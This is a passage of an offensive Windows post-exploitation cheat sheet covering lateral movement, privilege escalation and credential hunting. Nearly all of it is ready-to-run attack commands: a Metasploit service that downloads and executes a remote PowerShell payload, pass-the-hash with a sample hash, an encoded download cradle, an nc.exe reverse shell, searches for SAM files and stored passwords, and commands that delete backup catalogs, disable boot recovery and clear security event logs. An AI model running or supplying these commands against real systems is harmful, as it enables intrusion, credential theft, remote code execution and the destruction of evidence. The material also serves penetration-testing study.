<div class="codehilite"><pre><span></span><span class="nv">Use</span> <span class="nv">Metasploit</span> <span class="nv">web_delivery</span> <span class="nv">to</span> <span class="k">send</span> <span class="nv">script</span>

<span class="nv">sc</span> \\<span class="nv">machine</span> <span class="nv">create</span> <span class="nv">serviceName</span> <span class="nv">binPath</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring(&#39;http://10.9.122.8:8080/AZPLhG9txdFhS9n&#39;);</span><span class="s2">&quot;</span>
<span class="nv">sc</span> \\<span class="nv">machine</span> <span class="nv">start</span> <span class="nv">serviceName</span>
</pre></div></li>
</ul>
</li>
<li>Winexe<ul>
<li><a href="https://sourceforge.net/projects/winexe/">https://sourceforge.net/projects/winexe/</a>
  <div class="codehilite"><pre><span></span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span> <span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">82</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
</pre></div></li>
</ul>
</li>
<li>Pass the hash
    <div class="codehilite"><pre><span></span><span class="n">pth</span><span class="o">-</span><span class="n">winexe</span>
<span class="o">-</span><span class="n">U</span> <span class="n">jeeves</span><span class="o">/</span><span class="n">Administrator</span><span class="o">%</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e0fb1fb85756c24235ff238cbe81fe00</span>
<span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">63</span> <span class="n">cmd</span>
</pre></div></li>
<li>wmiexec.py<ul>
<li>Windows Management Instrumentation (WMI) to launch a semi-interactive shell.</li>
<li>WMI is the infrastructure for management data and operations on Windows (like SNMP).</li>
<li>without touching disk or creating a new service.
<div class="codehilite"><pre><span></span><span class="n">wmiexec</span><span class="p">.</span><span class="n">py</span> <span class="nl">administrator</span><span class="p">:</span><span class="n">password</span><span class="mf">@10.10.10.10</span>
</pre></div></li>
</ul>
</li>
<li>wmic
    <div class="codehilite"><pre><span></span><span class="n">wmic</span> <span class="n">computerystem</span> <span class="n">list</span> <span class="k">full</span> <span class="o">/</span><span class="n">format</span><span class="p">:</span><span class="n">list</span>  
<span class="n">wmic</span> <span class="n">process</span> <span class="n">list</span> <span class="o">/</span><span class="n">format</span><span class="p">:</span><span class="n">list</span>  
<span class="n">wmic</span> <span class="n">ntdomain</span> <span class="n">list</span> <span class="o">/</span><span class="n">format</span><span class="p">:</span><span class="n">list</span>  
<span class="n">wmic</span> <span class="n">useraccount</span> <span class="n">list</span> <span class="o">/</span><span class="n">format</span><span class="p">:</span><span class="n">list</span>  
<span class="n">wmic</span> <span class="k">group</span> <span class="n">list</span> <span class="o">/</span><span class="n">format</span><span class="p">:</span><span class="n">list</span>  
<span class="n">wmic</span> <span class="n">sysaccount</span> <span class="n">list</span> <span class="o">/</span><span class="n">format</span><span class="p">:</span><span class="n">list</span>  
</pre></div>
    - <a href="https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023">https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023</a>
    - <a href="https://windowstech.net/wmic-commands/">https://windowstech.net/wmic-commands/</a>
    - Can query remotely.
    - Logging for WMI events is disabled by default: <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx</a>
    <div class="codehilite"><pre><span></span><span class="n">wmic</span>
<span class="n">wmic</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="ss">&quot;machinename&quot;</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="ss">&quot;username&quot;</span> <span class="n">computerystem</span> <span class="n">list</span> <span class="k">full</span> <span class="o">/</span><span class="n">format</span><span class="p">:</span><span class="n">list</span>
</pre></div>
    - Local admins on a remote machine
    <div class="codehilite"><pre><span></span><span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="n">ordws01</span> <span class="n">path</span> <span class="n">win32_groupuser</span> <span class="k">where</span> <span class="p">(</span><span class="n">groupcomponent</span><span class="o">=</span><span class="ss">&quot;win32_group.name=\&quot;</span><span class="n">administrators</span><span class="err">\</span><span class="ss">&quot;,domain=\&quot;</span><span class="n">ORDWS01</span><span class="err">\</span><span class="ss">&quot;&quot;</span><span class="p">)</span>  
</pre></div>
    - Who is logged-in: <code class="codehilite"><span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="n">ordws01</span> <span class="n">path</span> <span class="n">win32_loggedonuser</span> <span class="k">get</span> <span class="n">antecedent</span></code>
    - Read nodes from text file: <code class="codehilite"><span class="n">wmic</span><span class="w"> </span><span class="o">/</span><span class="nl">node</span><span class="p">:</span><span class="nv">@workstations</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="n">win32_loggedonuser</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">antecedent</span><span class="w"></span></code>
    - Execute command:
    <div class="codehilite"><pre><span></span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">NoP</span> <span class="o">-</span><span class="n">sta</span> <span class="o">-</span><span class="n">NonI</span> <span class="o">-</span><span class="n">W</span> <span class="n">Hidden</span> <span class="o">-</span><span class="n">Enc</span> <span class="n">JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw</span><span class="p">...</span><span class="n">truncated</span><span class="p">...</span>  
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="n">ordws01</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">CSCOU</span><span class="err">\</span><span class="n">jarrieta</span> <span class="n">path</span> <span class="n">win32_process</span> <span class="k">call</span> <span class="k">create</span> <span class="ss">&quot;**empire launcher string here**&quot;</span>  
</pre></div>
    - Used in:
        - <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a>
        - <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a>
        - CrackMapExec
        - wmiexec.py
        - wmis</li>
<li>pth-wmis<ul>
<li>pth-wmis doesn’t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running.
  <div class="codehilite"><pre><span></span><span class="n">echo</span> <span class="ss">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://172.16.67.128:80/6WcepYO&#39;)&quot;</span> <span class="o">|</span> <span class="n">iconv</span> <span class="c1">--to-code UTF-16LE | base64 -w 0</span>
<span class="n">kaliwmis</span><span class="o">-</span><span class="mi">32</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">%</span><span class="n">badpassword</span> <span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span> <span class="ss">&quot;cmd.exe /c  powershell.exe -nop -enc &lt;base64-value&gt;&quot;</span>
</pre></div></li>
</ul>
</li>
<li>Windows Remote Management (WinRM)<ul>
<li>5985/tcp (HTTP) / 5986/tcp (HTTPS)</li>
<li>Allows remote management of Windows machines over HTTP(S) using SOAP.</li>
<li>On the backend it's utilizing WMI.</li>
<li>Enable: <code class="codehilite"><span class="n">Enable</span><span class="o">-</span><span class="n">PSRemoting</span> <span class="o">-</span><span class="k">Force</span> <span class="k">Set</span><span class="o">-</span><span class="n">Item</span> <span class="n">wsman</span><span class="p">:</span><span class="err">\</span><span class="n">localhost</span><span class="err">\</span><span class="n">client</span><span class="err">\</span><span class="n">trustedhosts</span> <span class="o">*</span></code></li>
<li>Test if target is configured for WinRM: <code class="codehilite"><span class="n">Test</span><span class="o">-</span><span class="n">WSMan</span> <span class="n">machinename</span></code></li>
<li>Execute command: <code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">Computer</span> <span class="n">ordws01</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="n">ipconfig</span> <span class="o">/</span><span class="k">all</span><span class="err">}</span> <span class="o">-</span><span class="n">credential</span> <span class="n">CSCOU</span><span class="err">\</span><span class="n">jarrieta</span></code>
    - Command line: <code class="codehilite"><span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">Computer</span> <span class="n">ordws01</span> <span class="o">-</span><span class="n">credential</span> <span class="n">CSCOU</span><span class="err">\</span><span class="n">jarrieta</span></code></li>
<li>Force enabling WinRM:
<div class="codehilite"><pre><span></span><span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">tools</span><span class="err">\</span><span class="n">SysinternalsSuite</span><span class="o">&gt;</span> <span class="p">.</span><span class="err">\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="err">\\</span><span class="n">ordws04</span> <span class="o">-</span><span class="n">u</span> <span class="n">cscou</span><span class="err">\</span><span class="n">jarrieta</span> <span class="o">-</span><span class="n">p</span> <span class="n">nastyCutt3r</span> <span class="o">-</span><span class="n">h</span> <span class="o">-</span><span class="n">d</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="ss">&quot;enable-psremoting -force&quot;</span>  
</pre></div></li>
</ul>
</li>
<li>CrackMapExec<ul>
<li>"-x" parameter to send commands.</li>
<li>wmiexec.py across multiple IPs</li>
</ul>
</li>
<li>Using Remote Desktop<ul>
<li>Impacket's rdp_check to see if you have RDP access,</li>
<li>Then use Kali's rdesktop to connect:</li>
</ul>
</li>
<li>Invoke command with credentials
    <div class="codehilite"><pre><span></span><span class="err">$</span><span class="k">user</span> <span class="o">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span>
<span class="err">$</span><span class="n">psw</span> <span class="o">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span>
<span class="err">$</span><span class="n">secpsw</span> <span class="o">=</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="err">$</span><span class="n">psw</span> <span class="o">-</span><span class="n">AsPlainText</span> <span class="o">-</span><span class="k">Force</span><span class="p">;</span>
<span class="err">$</span><span class="n">credential</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="err">$</span><span class="k">user</span><span class="p">,</span> <span class="err">$</span><span class="n">secpsw</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nt">invoke-command</span> <span class="nt">-computername</span> <span class="nt">localhost</span> <span class="nt">-credential</span> <span class="o">$</span><span class="nt">credential</span>
<span class="nt">-scriptblock</span> <span class="p">{</span><span class="err">cd</span> <span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="p">;</span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="o">.</span><span class="n">exe</span><span class="p">}</span>
</pre></div></li>
</ul>
<h2 id="general-exploits">General Exploits<a class="headerlink" href="#general-exploits" title="Permanent link">&para;</a></h2>
<h2 id="post-exploitation">Post Exploitation<a class="headerlink" href="#post-exploitation" title="Permanent link">&para;</a></h2>
<ul>
<li>Patch level  <ul>
<li><code class="codehilite"><span class="n">systeminfo</span></code></li>
<li><code class="codehilite"><span class="n">wmic</span> <span class="n">qfe</span> <span class="k">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span></code></li>
</ul>
</li>
<li>User info<ul>
<li><code class="codehilite"><span class="n">whoami</span></code></li>
<li><code class="codehilite"><span class="n">echo</span> <span class="o">%</span><span class="n">USERNAME</span><span class="o">%</span></code></li>
<li><code class="codehilite"><span class="n">net</span> <span class="k">user</span></code></li>
<li><code class="codehilite"><span class="n">net</span> <span class="n">localgroup</span></code></li>
<li><code class="codehilite"><span class="n">net</span> <span class="k">user</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li><code class="codehilite"><span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li><code class="codehilite"><span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span> <span class="o">&lt;</span><span class="k">Group</span> <span class="n">Name</span><span class="o">&gt;</span></code></li>
</ul>
</li>
<li>Firewall  <ul>
<li><code class="codehilite"><span class="nv">netsh</span> <span class="nv">firewall</span> <span class="k">show</span> <span class="nv">state</span></code></li>
<li><code class="codehilite"><span class="nv">netsh</span> <span class="nv">firewall</span> <span class="k">show</span> <span class="nv">config</span></code></li>
</ul>
</li>
<li>Network  <ul>
<li><code class="codehilite"><span class="n">ipconfig</span> <span class="o">/</span><span class="k">all</span></code></li>
<li><code class="codehilite"><span class="n">route</span> <span class="n">print</span></code></li>
<li><code class="codehilite"><span class="n">arp</span> <span class="o">-</span><span class="n">A</span></code></li>
</ul>
</li>
<li>Scheduled Tasks  <ul>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="o">/</span><span class="n">v</span></code> --copy output and save in txt  </li>
<li><code class="codehilite"><span class="n">cat</span> <span class="n">schtask</span><span class="p">.</span><span class="n">txt</span> <span class="o">|</span> <span class="n">grep</span> <span class="ss">&quot;SYSTEM\|Task To Run&quot;</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">B</span> <span class="mi">1</span> <span class="k">SYSTEM</span></code>  </li>
<li><code class="codehilite"><span class="n">dir</span> <span class="o">%</span><span class="n">SystemRoot</span><span class="o">%</span><span class="err">\</span><span class="n">Tasks</span></code><ul>
<li>e.g. c:\windows\tasks  </li>
<li>e.g. c:\windows\system32\tasks  </li>
</ul>
</li>
</ul>
</li>
<li>Services  <ul>
<li>Check service config can be modify or not<br />
  <div class="codehilite"><pre><span></span>accesschk.exe /accepteula  
accesschk.exe -uwcqv <span class="s2">&quot;Authenticated Users&quot;</span> * /accepteula  
accesschk.exe -ucqv \<span class="p">&lt;</span>Service Name&gt;  
</pre></div>
  <div class="codehilite"><pre><span></span>sc qc \<span class="p">&lt;</span>Service Name<span class="p">&gt;</span> -- Get service details  
</pre></div></li>
<li>Check service with weak file permission<br />
  <div class="codehilite"><pre><span></span><span class="k">for</span> <span class="k">/f</span> <span class="s2">&quot;tokens=2 delims=&#39;=&#39;&quot;</span> <span class="nv">%a in (&#39;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&#39;) do @echo %</span>a <span class="p">&gt;&gt;</span> c:\windows\temp\permissions.txt
for /f eol<span class="se">^=^&quot;^ </span>delims<span class="se">^=^&quot;</span> %a in (c:\windows\temp\permissions.txt<span class="p">)</span> <span class="k">do</span> cmd.exe /c icacls <span class="s2">&quot;%a&quot;</span>  
</pre></div>
  <div class="codehilite"><pre><span></span>sc.exe  
sc query state= all <span class="p">|</span> findstr <span class="s2">&quot;SERVICE_NAME:&quot;</span> <span class="p">&gt;&gt;</span> Servicenames.txt  
<span class="k">FOR</span> <span class="k">/F</span> <span class="nv">%i in (Servicenames.txt) DO echo %</span>i  
type Servicenames.txt  
FOR /F <span class="s2">&quot;tokens=2 delims= &quot;</span> <span class="nv">%i in (Servicenames.txt) DO @echo %</span>i <span class="p">&gt;&gt;</span> services.txt  
FOR /F <span class="nv">%i in (services.txt) DO @sc qc %</span>i <span class="p">|</span> findstr <span class="s2">&quot;BINARY_PATH_NAME&quot;</span> <span class="p">&gt;&gt;</span> path.txt  
</pre></div></li>
<li>Unquoted Service Path<br />
  <div class="codehilite"><pre><span></span>wmic service get name,displayname,pathname,startmode <span class="p">|</span>findstr /i <span class="s2">&quot;auto&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;c:\windows\\&quot;</span> <span class="p">|</span>findstr /i /v <span class="s2">&quot;&quot;&quot;  </span>
sc query  
sc qc service name  
</pre></div></li>
<li>AlwaysInstallElevated &lt;&lt; IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe<br />
  <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Installer</span><span class="err">\</span><span class="n">AlwaysInstallElevated</span>  
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Installer</span><span class="err">\</span><span class="n">AlwaysInstallElevated</span>  
</pre></div></li>
<li>Service only available from inside<br />
  <div class="codehilite"><pre><span></span><span class="n">netstat</span> <span class="o">-</span><span class="n">ano</span>  
<span class="n">upload</span> <span class="n">plink</span><span class="p">.</span><span class="n">exe</span>  
<span class="n">plink</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">R</span> <span class="s">&quot;remote port&quot;</span><span class="o">:</span><span class="mf">127.0.0.1</span><span class="o">:</span><span class="s">&quot;local port&quot;</span>  <span class="n">root</span><span class="s">@&quot;ipaddress&quot;</span>
</pre></div></li>
</ul>
</li>
<li>Passwords in files/registry<ul>
<li><a href="https://pentestlab.blog/tag/privilege-escalation/page/3/">https://pentestlab.blog/tag/privilege-escalation/page/3/</a></li>
<li><code class="codehilite"><span class="n">cmdkey</span> <span class="o">/</span><span class="n">list</span></code> If there are entries, it means that we may able to runas certain user who stored his cred in windows  <ul>
<li><code class="codehilite"><span class="n">runas</span> <span class="o">/</span><span class="n">savecred</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="k">ACCESS</span><span class="err">\</span><span class="n">Administrator</span> <span class="ss">&quot;c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe&quot;</span></code></li>
</ul>
</li>
<li>SAM file
  <div class="codehilite"><pre><span></span><span class="c">%SYSTEMROOT%\repair\SAM  </span>
<span class="c">%SYSTEMROOT%\System32\config\RegBack\SAM  </span>
<span class="c">%SYSTEMROOT%\System32\config\SAM  </span>
<span class="c">%SYSTEMROOT%\repair\system  </span>
<span class="c">%SYSTEMROOT%\System32\config\SYSTEM  </span>
<span class="c">%SYSTEMROOT%\System32\config\RegBack\system  </span>
</pre></div></li>
<li>Find
  <div class="codehilite"><pre><span></span><span class="n">findstr</span> <span class="o">/</span><span class="n">si</span> <span class="n">password</span> <span class="o">*</span><span class="p">.</span><span class="n">txt</span>  
<span class="n">findstr</span> <span class="o">/</span><span class="n">si</span> <span class="n">password</span> <span class="o">*</span><span class="p">.</span><span class="n">xml</span>  
<span class="n">findstr</span> <span class="o">/</span><span class="n">si</span> <span class="n">password</span> <span class="o">*</span><span class="p">.</span><span class="n">ini</span>  
<span class="n">findstr</span> <span class="o">/</span><span class="n">si</span> <span class="n">pass</span><span class="o">/</span><span class="n">pwd</span> <span class="o">*</span><span class="p">.</span><span class="n">ini</span>  
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">dir</span> <span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="n">pass</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="n">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="n">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="p">.</span><span class="n">config</span><span class="o">*</span>  
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">findstr</span> <span class="o">/</span><span class="n">spin</span> <span class="ss">&quot;password&quot;</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span>  
<span class="n">findstr</span> <span class="o">/</span><span class="n">spin</span> <span class="ss">&quot;password&quot;</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span>  
</pre></div></li>
<li>Specific credential files:
  <div class="codehilite"><pre><span></span><span class="n">Unattended</span><span class="o">?</span> <span class="n">vnc</span><span class="o">?</span>  
<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span>  
<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">xml</span>  
<span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">unattend</span><span class="p">.</span><span class="n">xml</span>  
<span class="o">%</span><span class="n">WINDIR</span><span class="o">%</span><span class="err">\</span><span class="n">Panther</span><span class="err">\</span><span class="n">Unattend</span><span class="err">\</span><span class="n">Unattended</span><span class="p">.</span><span class="n">xml</span>  
<span class="o">%</span><span class="n">WINDIR</span><span class="o">%</span><span class="err">\</span><span class="n">Panther</span><span class="err">\</span><span class="n">Unattended</span><span class="p">.</span><span class="n">xml</span>  
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">dir</span> <span class="o">/</span><span class="n">b</span> <span class="o">/</span><span class="n">s</span> <span class="n">unattend</span><span class="p">.</span><span class="n">xml</span>  
<span class="n">dir</span> <span class="o">/</span><span class="n">b</span> <span class="o">/</span><span class="n">s</span> <span class="n">web</span><span class="p">.</span><span class="n">config</span>  
<span class="n">dir</span> <span class="o">/</span><span class="n">b</span> <span class="o">/</span><span class="n">s</span> <span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span>  
<span class="n">dir</span> <span class="o">/</span><span class="n">b</span> <span class="o">/</span><span class="n">s</span> <span class="n">sysprep</span><span class="p">.</span><span class="n">xml</span>  
<span class="n">dir</span> <span class="o">/</span><span class="n">b</span> <span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="n">pass</span><span class="o">*</span>  
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">dir</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="o">*</span><span class="n">vnc</span><span class="p">.</span><span class="n">ini</span> <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">b</span>  
<span class="n">dir</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="o">*</span><span class="n">ultravnc</span><span class="p">.</span><span class="n">ini</span> <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">b</span>   
<span class="n">dir</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span> <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">b</span> <span class="o">|</span> <span class="n">findstr</span> <span class="o">/</span><span class="n">si</span> <span class="o">*</span><span class="n">vnc</span><span class="p">.</span><span class="n">ini</span>  
</pre></div></li>
<li>VNC<br />
  <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span>  
<span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKCU\Software\TightVNC\Server&quot;</span>  
</pre></div></li>
<li>Windows autologin<br />
  <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>  
<span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <span class="mi">2</span><span class="o">&gt;</span><span class="n">nul</span> <span class="o">|</span> <span class="n">findstr</span> <span class="ss">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span>  
</pre></div></li>
<li>SNMP Paramters: <code class="codehilite"><span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span></code></li>
<li>Putty: <code class="codehilite"><span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span></code></li>
<li>Search for password in registry<br />
  <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span> <span class="o">/</span><span class="n">f</span> <span class="n">password</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">s</span>  
<span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span> <span class="o">/</span><span class="n">f</span> <span class="n">password</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">s</span>  
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="important-files">Important Files<a class="headerlink" href="#important-files" title="Permanent link">&para;</a></h2>
<ul>
<li>Collections<ul>
<li>Windows EXE / DLL files: <a href="http://www.saule-spb.ru/touch/windows_files.html">http://www.saule-spb.ru/touch/windows_files.html</a></li>
<li>Living Off The Land Binaries and Scripts: <a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a> <a href="https://github.com/LOLBAS-Project/LOLBAS">https://github.com/LOLBAS-Project/LOLBAS</a></li>
<li><a href="https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows">https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows</a></li>
</ul>
</li>
<li>During LFI: 
    <div class="codehilite"><pre><span></span><span class="c">%SYSTEMROOT%\repair\system</span>
<span class="c">%SYSTEMROOT%\repair\SAM</span>
<span class="c">%SYSTEMROOT%\repair\SAM</span>
<span class="c">%WINDIR%\win.ini</span>
<span class="c">%SYSTEMDRIVE%\boot.ini</span>
<span class="c">%WINDIR%\Panther\sysprep.inf</span>
<span class="c">%WINDIR%\system32\config\AppEvent.Evt</span>
</pre></div></li>
<li>Version information<ul>
<li><code class="codehilite"><span class="n">sysinfo</span></code></li>
<li>Windows 7+: <code class="codehilite"><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">system32</span><span class="o">/</span><span class="n">license</span><span class="p">.</span><span class="n">rtf</span></code></li>
<li><code class="codehilite"><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">system32</span><span class="o">/</span><span class="n">eula</span><span class="p">.</span><span class="n">txt</span></code></li>
</ul>
</li>
<li>Updates:<ul>
<li>Update information: <code class="codehilite"><span class="n">WindowsUpdate</span><span class="p">.</span><span class="n">log</span></code></li>
<li>Update Download locations: <code class="codehilite"><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SoftwareDistribution</span><span class="err">\</span><span class="n">Download</span></code></li>
</ul>
</li>
<li>wbadmin / ntbackup<ul>
<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin</a></li>
<li>Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface.</li>
<li>Delete any recovery catalogs:
  <div class="codehilite"><pre><span></span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="k">c</span> <span class="n">wbadmin</span><span class="p">.</span><span class="n">exe</span> <span class="k">delete</span> <span class="k">catalog</span> <span class="o">-</span><span class="n">quiet</span>
</pre></div></li>
</ul>
</li>
<li>BCDEdit<ul>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options">https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options</a></li>
<li>Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings.</li>
<li>Usable to creating new stores, modifying existing stores, adding boot menu options, and so on.</li>
<li>Windows recovery console does not attempt to repair anything:
  <div class="codehilite"><pre><span></span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="k">c</span> <span class="n">bcdedit</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="k">set</span> <span class="err">{</span><span class="k">default</span><span class="err">}</span> <span class="n">bootstatuspolicy</span> <span class="n">ignoreallfailures</span> <span class="o">&amp;</span> <span class="n">bcdedit</span> <span class="o">/</span><span class="k">set</span> <span class="err">{</span><span class="k">default</span><span class="err">}</span> <span class="n">recoveryenabled</span> <span class="k">no</span>
</pre></div></li>
</ul>
</li>
<li>wevtutil<ul>
<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil</a></li>
<li>Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.</li>
<li>Clear System and Security logs:
  <div class="codehilite"><pre><span></span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="k">c</span> <span class="n">wevtutil</span><span class="p">.</span><span class="n">exe</span> <span class="n">cl</span> <span class="k">System</span>
<span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="k">c</span> <span class="n">wevtutil</span><span class="p">.</span><span class="n">exe</span> <span class="n">cl</span> <span class="k">Security</span>
</pre></div></li>
</ul>
</li>
<li>DUMPBIN<ul>
